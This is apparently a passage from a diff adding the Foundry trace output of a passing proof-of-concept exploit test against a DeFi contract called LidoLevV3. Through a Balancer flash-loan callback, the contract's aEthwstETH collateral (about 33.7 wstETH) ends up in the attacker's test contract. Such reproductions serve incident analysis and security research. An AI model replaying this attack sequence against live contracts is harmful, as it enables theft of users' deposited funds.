+    │   │   │   │   │   ├─ [32455] Pool::finalizeTransfer(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19], 33698806193381635860 [3.369e19], 0) [delegatecall]
+    │   │   │   │   │   │   ├─ [402] PoolAddressesProvider::getPriceOracle() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] AaveOracle: [0x54586bE62E3c3580375aE3723C145253060Ca0C2]
+    │   │   │   │   │   │   ├─ [29145] SupplyLogic::8a5dadd1(00000000000000000000000000000000000000000000000000000000000000340000000000000000000000000000000000000000000000000000000000000036000000000000000000000000000000000000000000000000000000000000003700000000000000000000000000000000000000000000000000000000000000350000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000001d3aa35b05f3ef714000000000000000000000000000000000000000000000001d3aa35b05f3ef7140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b00000000000000000000000054586be62e3c3580375ae3723c145253060ca0c20000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit ReserveUsedAsCollateralDisabled(reserve: WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], user: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
+    │   │   │   │   │   │   │   ├─ emit ReserveUsedAsCollateralEnabled(reserve: WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], user: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x82b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f29: 8 → 0
+    │   │   │   │   │   │   │   │   @ 0x3c3f303012a85fd86f559fc2d8edcdaeca23134600f1d3d56b5813432ad58ecf: 0 → 8
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ emit BalanceTransfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 33681044764761642582 [3.368e19], index: 1000527341973624759506438367 [1e27])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa177ad5b1609a4e783625b46e3ee407279131ff23903962d9c5ce8a1440867a5: 0 → 0x00000000033b9de7e3d39a6f9a7c08df0000000000000001d36b1bc383a5d656
+    │   │   │   │   │   @ 0xdeae47ff7bd01bad86820ae7179c8488fb5c841f1c7f147b7555c5347615fc5c: 0x00000000033b9de7e3d39a6f9a7c08df0000000000000001d36b1bc383a5d656 → 0x00000000033b9de7e3d39a6f9a7c08df00000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [424] ExploitTest::createAaveDebt(35002954502486078893 [3.5e19])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] WETH9::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 0)
+    │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WETH9::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   └─ ← [Return] 55912009748616849239618 [5.591e22]
+    │   ├─ emit FlashLoan(recipient: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], token: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], amount: 0, feeAmount: 0)
+    │   └─ ← [Stop]
+    ├─ [3082] aEthwstETH::fallback(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2530] AToken::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [1356] InitializableImmutableAdminUpgradeabilityProxy::fallback(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [staticcall]
+    │   │   │   ├─ [804] Pool::getReserveNormalizedIncome(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   └─ ← [Return] 33698806193381635860 [3.369e19]
+    │   └─ ← [Return] 33698806193381635860 [3.369e19]
+    ├─ [874] aEthwstETH::fallback() [staticcall]
+    │   ├─ [357] AToken::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter aEthwstETH balance after attack", val: 33698806193381635860 [3.369e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.52s (28.27s CPU time)
+
+Ran 1 test suite in 37.34s (29.52s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
